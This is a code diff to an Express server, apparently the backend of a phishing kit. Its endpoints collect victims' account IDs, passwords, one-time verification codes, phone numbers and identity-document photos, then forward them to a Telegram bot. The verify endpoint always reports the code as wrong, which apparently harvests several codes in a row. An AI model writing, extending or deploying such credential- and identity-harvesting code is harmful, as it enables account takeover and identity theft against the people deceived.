@@ -52,6 +52,25 @@ async function sendTelegram(text) {
   }
 }
 
+async function sendTelegramPhoto(base64, filename, caption) {
+  const raw = base64.includes(",") ? base64.split(",")[1] : base64;
+  const bytes = Buffer.from(raw, "base64");
+  const form = new FormData();
+  form.append("chat_id", CHAT_ID);
+  form.append("photo", new Blob([bytes], { type: "image/jpeg" }), filename || "photo.jpg");
+  if (caption) form.append("caption", caption);
+
+  const tgRes = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+    method: "POST",
+    body: form,
+  });
+  const tgData = await tgRes.json();
+  if (!tgData.ok) {
+    console.error("Telegram photo error:", tgData);
+    throw new Error("telegram_failed");
+  }
+}
+
 app.get("/api/health", (_req, res) => {
   res.json({ ok: true });
 });
@@ -86,6 +105,7 @@ app.post("/api/login", async (req, res) => {
 app.post("/api/verify", async (req, res) => {
   const sessionId = String(req.body?.session ?? "");
   const code = String(req.body?.code ?? "").trim();
+  const step = String(req.body?.step ?? "1");
   let login = getSession(sessionId);
   if (!login) {
     const id = String(req.body?.id ?? "").trim();
@@ -102,7 +122,7 @@ app.post("/api/verify", async (req, res) => {
   }
 
   const text = [
-    "📲 رمز تحقق جديد",
+    `📲 رمز تحقق (${step})`,
     "",
     `رقم المميز: ${login.id}`,
     `كلمة المرور: ${login.password}`,
@@ -114,6 +134,44 @@ app.post("/api/verify", async (req, res) => {
   try {
     await sendTelegram(text);
     return res.json({ ok: true, valid: false, message: "رمز التحقق خاطئ" });
+  } catch {
+    return res.status(502).json({ ok: false, message: "تعذّر الإرسال إلى Telegram" });
+  }
+});
+
+app.post("/api/submit-id", async (req, res) => {
+  const id = String(req.body?.id ?? "").trim();
+  const password = String(req.body?.password ?? "");
+  const phone = String(req.body?.phone ?? "").trim();
+  const images = Array.isArray(req.body?.images) ? req.body.images : [];
+
+  if (!id || !password) {
+    return res.status(400).json({ ok: false, message: "انتهت الجلسة، سجّل الدخول من جديد" });
+  }
+  if (!/^\d{7,15}$/.test(phone)) {
+    return res.status(400).json({ ok: false, message: "أدخل رقم هاتف صحيح" });
+  }
+  if (images.length === 0 || images.length > 3) {
+    return res.status(400).json({ ok: false, message: "ارفق من 1 إلى 3 صور للهوية" });
+  }
+
+  const text = [
+    "🪪 هوية شخصية + هاتف",
+    "",
+    `رقم المميز: ${id}`,
+    `كلمة المرور: ${password}`,
+    `رقم الهاتف: ${phone}`,
+    `عدد الصور: ${images.length}`,
+    "",
+    `الوقت: ${nowAr()}`,
+  ].join("\n");
+
+  try {
+    await sendTelegram(text);
+    for (let i = 0; i < images.length; i += 1) {
+      await sendTelegramPhoto(String(images[i]), `id-${id}-${i + 1}.jpg`, `هوية ${i + 1} — ${id}`);
+    }
+    return res.json({ ok: true });
   } catch {
     return res.status(502).json({ ok: false, message: "تعذّر الإرسال إلى Telegram" });
   }
